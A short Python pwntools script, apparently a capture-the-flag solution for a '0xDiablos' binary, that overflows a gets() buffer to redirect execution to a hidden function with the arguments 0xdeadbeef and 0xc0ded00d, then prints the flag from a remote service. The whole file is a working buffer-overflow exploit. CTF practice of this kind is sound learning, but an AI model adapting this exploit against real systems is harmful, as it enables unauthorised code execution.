#!/usr/bin/python3

# Use pwn library
from pwn import *

# 180 is the maximum buffer length where gets() writes
# buff + 8 = IP = vuln()
# buff + 8 + 4 = return address
# buff + 8 + 8 = vuln(arg1, ...)
# buff + 8 + 12 = vuln(..., arg2)
payload = b'\0' * 188 + b'\xe2\x91\x04\x08' + b'\x00\x00\x00\x00\xef\xbe\xad\xde\x0d\xd0\xde\xc0'

# Main function
def exploit():
    # IP has to be changed
    binary = remote("IP", PORT)
    # Send the payload to the program
    binary.sendlineafter(b'0xDiablos', payload)
    # Dummy recv()'s
    binary.recv()
    binary.recv()
    # Grab last output as string
    flag = str(binary.recv())
    # Splice the flag from the string and print it
    print("[" '\033[92m' "âœ“" '\033[0m' "]", flag[2:-1])
    # Close the connection
    binary.close()

# Default target is launch()
if __name__ == '__main__':
    exploit()
